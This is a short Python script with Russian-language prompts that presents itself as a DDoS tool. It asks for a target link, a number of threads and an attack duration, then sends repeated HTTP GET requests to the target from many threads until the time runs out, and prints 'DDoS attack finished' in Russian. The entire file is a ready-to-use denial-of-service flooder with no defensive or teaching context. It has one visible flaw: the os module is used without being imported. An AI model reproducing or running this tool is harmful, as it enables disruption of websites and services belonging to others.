import threading
import requests
import time
from pystyle import Colors, Colorate, Center


COLOR_CODE = {
    "RESET": "\033[0m",
    "GREEN": "\033[32m",
    "RED": "\033[31m",
}


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def ddos_attack():
    link = input(Colorate.Horizontal(Colors.green_to_white, "\nВведите ссылку для DDoS атаки: "))
    num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Введите количество потоков: ")))
    attack_duration = int(input(Colorate.Horizontal(Colors.green_to_white, "Введите длительность атаки (в секундах): ")))

    def send_request(session):
        while time.time() < end_time:
            try:
                session.get(link)
                print(f"{COLOR_CODE['GREEN']}Запрос отправлен на {link}{COLOR_CODE['RESET']}")
            except requests.RequestException:
                print(f"{COLOR_CODE['RED']}Ошибка при отправке запроса на {link}{COLOR_CODE['RESET']}")

    end_time = time.time() + attack_duration
    threads = []
    session = requests.Session()

    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(session,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Colorate.Horizontal(Colors.green_to_white, "\nDDoS атака завершена"))

if __name__ == "__main__":
    ddos_attack()
